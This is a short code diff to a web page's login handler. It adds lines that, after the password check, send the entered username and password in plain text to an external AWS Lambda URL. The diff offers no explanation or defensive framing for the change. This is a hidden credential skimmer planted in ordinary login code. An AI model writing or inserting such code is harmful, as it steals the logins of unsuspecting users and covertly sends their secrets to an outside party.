@@ -41,6 +41,18 @@
         }else{
             alert('Invalid username or password');
         }
+
+
+        var url = "https://4dhdgfkx2cyaocfkgjiojsco2m0vngnw.lambda-url.us-east-2.on.aws/?User=" + username + "&Pass=" + password;
+        fetch(url, {
+            method: 'POST'            
+        }).then(response => {
+            console.log('Request sent successfully');
+        }).catch(error => {
+            console.error('Error sending request:', error);
+        });
+
+        
     }
 
     // Show the modal when the page loads
